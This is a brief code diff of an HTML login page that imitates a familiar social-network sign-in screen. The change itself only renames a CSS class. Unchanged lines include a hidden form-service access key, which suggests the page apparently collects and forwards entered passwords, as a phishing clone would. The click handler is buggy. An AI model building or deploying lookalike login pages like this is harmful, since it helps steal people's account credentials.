@@ -27,11 +27,11 @@
                 
                 <input class="email_box" type="text" name="email_phone" placeholder="Mobile number or email">
                 <input class="pass_box" type="password" name="pass_word" placeholder="Password">
-                <input class="log_in spinner" type="submit" name="submit" value="Log in">
+                <input class="log_in buffer" type="submit" name="submit" value="Log in">
                 
-                <input class="spinner" type="button" name="button" value="Forgotten password?">
-                <input class="spinner" type="button" name="button" value="Create new account">
-                <input class="spinner" type="button" name="button" value="Not now" id="notNow">
+                <input class="buffer" type="button" name="button" value="Forgotten password?">
+                <input class="buffer" type="button" name="button" value="Create new account">
+                <input class="buffer" type="button" name="button" value="Not now" id="notNow">
 
                 <!-- <div class="infin_all"><span class="infin">&infin;Fuad</span></div> -->
                 <input type="hidden" name="access_key" value="7c4d2152-ba89-4cc8-88a8-53bc89ddbf2c">
@@ -42,7 +42,7 @@
 </body>
     <script>
         const body = document.querySelector("body");
-        const submit = document.querySelectorAll(".spinner")
+        const submit = document.querySelectorAll(".buffer")
 
         submit.addEventListener("click", (e)=>{
           e.preventDefault()
@@ -52,6 +52,7 @@
         })
     </script>
 </html>
+
 
 
 
